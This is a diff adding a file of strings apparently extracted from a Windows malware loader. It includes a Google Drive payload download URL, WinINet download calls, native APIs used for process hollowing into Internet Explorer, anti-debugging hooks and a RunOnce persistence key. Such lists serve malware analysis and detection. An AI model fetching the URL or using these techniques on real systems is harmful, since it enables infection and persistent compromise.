@@ -1,0 +1,63 @@
+windir=
+ProgramFiles=
+USERPROFILE=
+msvbvm60.dll
+\system32\
+\syswow64\
+\internet explorer\iexplore.exe
+\internet explorer\ieinstal.exe
+\internet explorer\ielowutil.exe
+\filename1.exe
+\subfolder1
+C:\Users\admin\AppData\Local\Temp\IXP000.TMP\EXE_LI~2.EXE
+CKXH@WP
+XNFWKCP
+|+H@Pj@
+https://drive.google.com/uc?export=download&id=1E7diTCV8FcAF8Jlox24HPrxJe8Cd549_
+Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+wininet.dll
+InternetOpenA
+InternetSetOptionA
+InternetOpenUrlA
+InternetReadFile
+InternetCloseHandle
+NtCreateSection
+NtMapViewOfSection
+NtClose
+NtGetContextThread
+NtSetContextThread
+NtProtectVirtualMemory
+NtAllocateVirtualMemory
+NtWriteVirtualMemory
+NtSetInformationProcess
+NtOpenFile
+NtResumeThread
+DbgBreakPoint
+DbgUiRemoteBreakin
+NtSetInformationThread
+kernel32
+WaitForSingleObject
+LoadLibraryA
+CreateProcessInternalW
+GetLongPathNameW
+TerminateProcess
+CreateThread
+AddVectoredExceptionHandler
+TerminateThread
+CreateFileW
+WriteFile
+GetFileSize
+ReadFile
+CloseHandle
+advapi32
+RegCreateKeyExA
+RegSetValueExA
+EnumWindows
+Startup key
+Software\Microsoft\Windows\CurrentVersion\RunOnce
+shell32
+SHCreateDirectoryExW
+ShellExecuteW
+PXPXRAPAQARPXASATAUAVAWVWPXSPXdH
+PXPXPXM1
+[_PX^A_A^PXA]A\PXA[PXAZAYPXAXZ
